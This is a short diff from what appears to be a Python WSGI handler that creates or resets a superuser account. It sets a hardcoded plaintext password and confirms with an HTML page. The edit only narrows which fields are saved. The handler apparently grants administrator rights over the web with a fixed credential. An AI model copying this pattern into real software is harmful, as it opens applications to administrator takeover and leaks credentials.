@@ -46,7 +46,7 @@ def application(environ, start_response):
                 }
             )
             user.set_password('Egy360Admin2026!')
-            user.save()
+            user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
             msg = "Admin created!" if created else "Admin password reset!"
             body = f"""<!DOCTYPE html>
 <html><body>
